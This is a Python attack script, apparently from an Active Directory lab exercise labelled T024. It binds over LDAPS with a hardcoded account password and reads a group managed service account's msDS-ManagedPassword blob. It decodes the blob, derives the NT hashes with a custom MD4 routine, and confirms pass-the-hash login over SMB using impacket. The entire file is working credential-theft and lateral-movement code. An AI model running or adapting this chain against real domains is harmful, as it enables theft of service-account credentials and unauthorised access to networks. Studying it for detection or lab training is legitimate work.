# T024 - gMSA Extraction as eng_cloud (ACE#10 ReadGMSAPassword) - ws01 native
# Chain: LDAPS bind as eng_cloud -> read msDS-ManagedPassword -> decode blob ->
#        compute NT hash (pure MD4) -> validate auth via impacket SMB as gmsaTools$
# All in-script, no Start-Process / schtask.
import struct
import io
import sys

# ---------- pure MD4 ----------
def md4(data: bytes) -> bytes:
    A, B, C, D = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
    F = lambda x, y, z: (x & y) | (~x & z)
    G = lambda x, y, z: (x & y) | (x & z) | (y & z)
    H = lambda x, y, z: x ^ y ^ z
    shifts = [[3, 7, 11, 19] * 4, [3, 5, 9, 13] * 4, [3, 9, 11, 15] * 4]
    msg = bytearray(data)
    ml = len(msg) * 8
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack('<Q', ml & 0xFFFFFFFFFFFFFFFF)
    def rol(x, n):
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
    for off in range(0, len(msg), 64):
        block = msg[off:off+64]
        X = list(struct.unpack('<16I', block))
        a, b, c, d = A, B, C, D
        for i in range(16):
            k = i
            a = rol((a + F(b, c, d) + X[k]) & 0xFFFFFFFF, shifts[0][i % 4])
            a, b, c, d = d, a, b, c
        for i in range(16):
            k = (i % 4) * 4 + (i // 4)
            a = rol((a + G(b, c, d) + X[k] + 0x5A827999) & 0xFFFFFFFF, shifts[1][i % 4])
            a, b, c, d = d, a, b, c
        order3 = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15]
        for i in range(16):
            k = order3[i]
            a = rol((a + H(b, c, d) + X[k] + 0x6ED9EBA1) & 0xFFFFFFFF, shifts[2][i % 4])
            a, b, c, d = d, a, b, c
        A = (A + a) & 0xFFFFFFFF
        B = (B + b) & 0xFFFFFFFF
        C = (C + c) & 0xFFFFFFFF
        D = (D + d) & 0xFFFFFFFF
    return struct.pack('<4I', A, B, C, D)

# ---------- 1) LDAPS bind as eng_cloud ----------
from ldap3 import Server, Connection, NTLM, ALL
server = Server('192.168.77.10', port=636, use_ssl=True, get_info=ALL)
conn = Connection(server, user='cadre.local\\eng_cloud', password='Cl0ud_Eng!', authentication=NTLM, auto_bind=True)
print('LDAPS_BIND_OK')
conn.search('CN=Managed Service Accounts,DC=cadre,DC=local',
            '(sAMAccountName=gmsaTools$)',
            attributes=['msDS-ManagedPassword', 'msDS-ManagedPasswordId', 'msDS-ManagedPasswordPreviousId', 'objectGUID'])
blob = None
for e in conn.entries:
    print('DN', e.entry_dn)
    mp = e['msDS-ManagedPassword'].value
    if isinstance(mp, bytes):
        blob = mp
        print('BLOB_LEN', len(mp))
    else:
        print('NO_BLOB')
conn.unbind()

if not blob:
    print('GMSA_BLOB_MISSING')
    sys.exit(1)

# ---------- 2) decode MSDS-MANAGEDPASSWORD_BLOB ----------
version, reserved, length = struct.unpack_from('<HHI', blob, 0)
cur_off, prev_off, query_off, unchanged_off = struct.unpack_from('<HHHH', blob, 8)
print('VERSION', version, 'LENGTH', length, 'ACTUAL', len(blob))
print('OFFSETS cur=%d prev=%d query=%d unchanged=%d' % (cur_off, prev_off, query_off, unchanged_off))

def read_wstr_raw(off):
    if off == 0:
        return None
    end = blob.index(b'\x00\x00', off)
    return blob[off:end]

cur_raw = read_wstr_raw(cur_off)
prev_raw = read_wstr_raw(prev_off)

nt_hash = None
if cur_raw:
    nt_hash = md4(cur_raw).hex()
    print('CURRENT_PW_LEN', len(cur_raw))
    print('NTHASH', nt_hash)
if prev_raw:
    print('NTHASH_PREV', md4(prev_raw).hex())

# ---------- 3) validate auth via impacket SMB as gmsaTools$ ----------
if nt_hash:
    from impacket.smbconnection import SMBConnection
    try:
        smb = SMBConnection('192.168.77.10', '192.168.77.10')
        smb.login('gmsaTools$', '', 'cadre.local', nthash=nt_hash)
        print('SMB_AUTH_OK as gmsaTools$')
        smb.logoff()
    except Exception as e:
        print('SMB_AUTH_FAIL', e)
print('T024_DONE')
